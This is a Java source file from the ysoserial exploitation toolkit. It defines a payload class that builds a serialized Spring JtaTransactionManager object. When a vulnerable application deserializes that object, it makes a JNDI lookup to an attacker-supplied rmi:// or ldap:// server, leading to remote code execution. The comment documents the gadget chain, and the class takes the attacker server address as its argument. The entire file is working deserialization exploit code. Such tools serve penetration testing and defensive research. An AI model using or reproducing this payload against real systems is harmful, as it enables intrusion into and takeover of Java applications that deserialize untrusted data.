package ysoserial.payloads;

import org.springframework.transaction.jta.JtaTransactionManager;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

/**
*
* Gadget chain:
* 	
* 	org.springframework.transaction.jta.JtaTransactionManager.readObject()
* 	org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager()
* 	org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction()
* 		org.springframework.jndi.JndiTemplate.lookup()
* 			javax.naming.InitialContext.lookup()
* 
*
* Arguments:
* - (rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>
*
*
* @author zerothoughts
* 	payload added by sciccone
* 
* This gadget was discovered by zerothoughts:
* https://github.com/zerothoughts/spring-jndi
* 
*/
@PayloadTest(harness="ysoserial.test.payloads.JRMPReverseConnectTest")
@Dependencies( { 
	"org.springframework:spring-tx:5.1.7.RELEASE", 
	"org.springframework:spring-context:5.1.7.RELEASE",
	"javax.transaction:jta:1.1"
	} )
@Authors({ Authors.ZEROTHOUGHTS, Authors.SCICCONE })
public class SpringJta implements ObjectPayload<Object>, DynamicDependencies {

	@Override
	public Object getObject(String command) throws Exception {
		
		// validate command
        if ( !(command.startsWith("ldap://") || command.startsWith("rmi://")) ) 
			throw new IllegalArgumentException("Command format is: "
					+ "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");
        
        // create object
        JtaTransactionManager jta = new JtaTransactionManager();
		jta.setUserTransactionName(command);
		
		return jta;
	}

	
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(SpringJta.class, args);
    }
    
    
    // add dependencies for testing 
    public static String[] getDependencies () {
        return new String[] {
        	"org.springframework:spring-tx:5.1.7.RELEASE", 
        	"org.springframework:spring-context:5.1.7.RELEASE",
        	"org.springframework:spring-beans:5.1.7.RELEASE",
        	"org.springframework:spring-core:5.1.7.RELEASE",
        	"commons-logging:commons-logging:1.2",
        	"javax.transaction:jta:1.1"
        };

    }
}
